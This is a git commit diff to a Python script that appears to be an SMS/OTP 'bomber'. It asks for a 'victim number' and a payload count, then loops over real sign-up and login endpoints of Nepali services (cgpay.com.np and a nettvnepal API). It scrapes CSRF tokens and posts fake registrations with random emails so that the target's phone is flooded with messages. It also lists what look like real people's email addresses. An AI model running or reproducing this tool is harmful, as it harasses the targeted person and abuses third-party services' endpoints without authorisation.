a0dfb1b75bba295873ccf51870b4f2ea9e37359d
BitByteButter <romeokarki24@gmail.com>
2021-06-15 21:34:03 +0545

    here go

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 from bs4.builder import HTML_5
 import requests
+import random
 from bs4 import BeautifulSoup
 url ="https://cgpay.com.np/Home/SignUp"
 username =[
@@ -41,7 +42,10 @@ Email = [
     "BiswaJamarkattel@gmail.com"
 ]
 
+
+
 number =input('Please enter the victim number \n')
+print(type(number))
 nth =input('Please enter the Number of  payloads to send \n')
 
 r = requests.session()
@@ -64,5 +68,20 @@ for i in range(int(nth)):
     payload['__RequestVerificationToken'] =soup.find('input',attrs={'name':'__RequestVerificationToken'})['value']
     print(payload)
     s=r.post("https://cgpay.com.np/Home/Login",data=payload,allow_redirects=True)
+    
     print(s.status_code)
+
+z =requests.session()
+for i in range(int(nth)):
+    email = ''.join(random.choice('0123456789ABCDEF') for i in range(7))+'@paypal.com'
+    data = {
+        "user_email": email,
+        "first_name": "OOpsie",
+        "last_name": "WOOpsie",
+        "telephone": int(number),
+        "password": "testtest",
+        "password_confirmation": "testtest",
+        "phone": int(number)
+    }
+    bomb = z.post("https://app.nettvnepal.com.np/api/v5/ntc/check/register",data=data)
     
